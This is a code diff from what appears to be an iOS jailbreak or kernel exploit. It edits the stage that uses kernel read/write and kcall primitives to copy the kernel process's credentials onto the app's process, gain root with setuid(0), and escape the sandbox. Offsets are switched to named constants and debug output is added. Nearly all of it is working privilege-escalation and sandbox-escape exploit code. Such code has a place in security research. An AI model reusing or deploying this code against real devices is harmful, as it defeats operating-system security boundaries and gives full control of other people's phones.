@@ -17,11 +17,12 @@
 #include "krw.h"
 #include "dropbear.h"
 #include "bootstrap.h"
+#include "label.h"
 
 uint64_t mineek_find_port(mach_port_name_t port){
     uint64_t task_addr = get_selftask();
-    uint64_t itk_space = kread64(task_addr + 0x308);
-    uint64_t is_table = kread64(itk_space + 0x20);
+    uint64_t itk_space = kread64(task_addr + off_task_itk_space);
+    uint64_t is_table = kread64(itk_space + off_ipc_space_is_table);
     uint32_t port_index = port >> 8;
     const int sizeof_ipc_entry_t = 0x18;
     uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));
@@ -114,7 +115,7 @@ void mineek_getRoot(uint64_t proc_addr)
     self_ucred = kread64(self_ro + 0x20);
     printf("[i] ucred: 0x%llx\n", self_ucred);
     printf("[i] test_uid = %d\n", getuid());
-
+    
     uint64_t kernproc = get_kernproc();
     printf("[i] kern proc: 0x%llx\n", kernproc);
     uint64_t kern_ro = kread64(kernproc + 0x20);
@@ -124,39 +125,16 @@ void mineek_getRoot(uint64_t proc_addr)
     
     cr_label = kread64(self_ucred + off_u_cr_label); // MAC label
     orig_sb = kread64(cr_label + off_sandbox_slot);// not working
-
-    sb = unsandbox(getpid());
+    
+    printf("[i] cr_label: 0x%llx\n", cr_label);
+    printf("[i] orig_sb: 0x%llx\n", orig_sb);
+    printf("[i] cr_label?: 0x%llx\n", kread64(cr_label));
+    printf("[i] orig_sb?: 0x%llx\n", kread64(orig_sb));
     
     kcall(off_proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
     setuid(0);
     setuid(0);
     printf("[i] getuid: %d\n", getuid());
-}
-
-void ucred_test(uint64_t proc_addr) {
-    uint64_t self_ro = kread64(proc_addr + 0x20);
-    uint64_t self_ucred = kread64(self_ro + 0x20);
-    uint64_t kernproc = get_kernproc();
-    uint64_t kern_ro = kread64(kernproc + 0x20);
-    uint64_t kern_ucred = kread64(kern_ro + 0x20);
-    uint64_t proc_set_ucred = off_proc_set_ucred;
-    proc_set_ucred += get_kslide();
-    
-    uint64_t ucred = self_ucred;
-    
-    printf("[DEBUG] proc + off_p_uid:  0x%x\n", kread32(kernproc + off_p_uid));
-    printf("[DEBUG] proc + off_p_ruid: 0x%x\n", kread32(kernproc + off_p_ruid));
-    printf("[DEBUG] proc + off_p_gid:  0x%x\n", kread32(kernproc + off_p_gid));
-    printf("[DEBUG] proc + off_p_rgid: 0x%x\n", kread32(kernproc + off_p_rgid));
-    printf("[DEBUG] ucred + off_u_cr_uid:     0x%x\n", kread32(ucred + off_u_cr_uid));
-    printf("[DEBUG] ucred + off_u_cr_ruid:    0x%x\n", kread32(ucred + off_u_cr_ruid));
-    printf("[DEBUG] ucred + off_u_cr_svuid:   0x%x\n", kread32(ucred + off_u_cr_svuid));
-    printf("[DEBUG] ucred + off_u_cr_ngroups: 0x%x\n", kread32(ucred + off_u_cr_ngroups));
-    printf("[DEBUG] ucred + off_u_cr_groups:  0x%x\n", kread32(ucred + off_u_cr_groups));
-    printf("[DEBUG] ucred + off_u_cr_rgid:    0x%x\n", kread32(ucred + off_u_cr_rgid));
-    printf("[DEBUG] ucred + off_u_cr_svgid:   0x%x\n", kread32(ucred + off_u_cr_svgid));
-    
-    printf("[i] uid: %d, gid: %d\n", getuid(), getgid());
 }
 
 void stage2(void) {
@@ -169,10 +147,10 @@ void stage2(void) {
     printf("[i] getRoot!\n");
     mineek_getRoot(proc_addr);
     usleep(10000);
-    ucred_test(proc_addr);
 }
 
 void stage2_all(void) {
+    __block int ret = -1;
     pid_t pid = getpid();
     printf("[i] pid = %d\n", pid);
     uint64_t proc_addr = proc_of_pid(getpid());
@@ -182,12 +160,5 @@ void stage2_all(void) {
     printf("[i] getRoot!\n");
     mineek_getRoot(proc_addr);
     usleep(10000);
-    ucred_test(proc_addr);
-    usleep(10000);
-    
-    // todo: get kernel
-    // kreadbuf(0xFFFFFFF007004000 + get_kslide(), rawkern, ksize);
-    // todo: output
-    // todo: kpf(rawkern)
-    //unsandbox_stage2();
+    sb = unsandbox(getpid());
 }
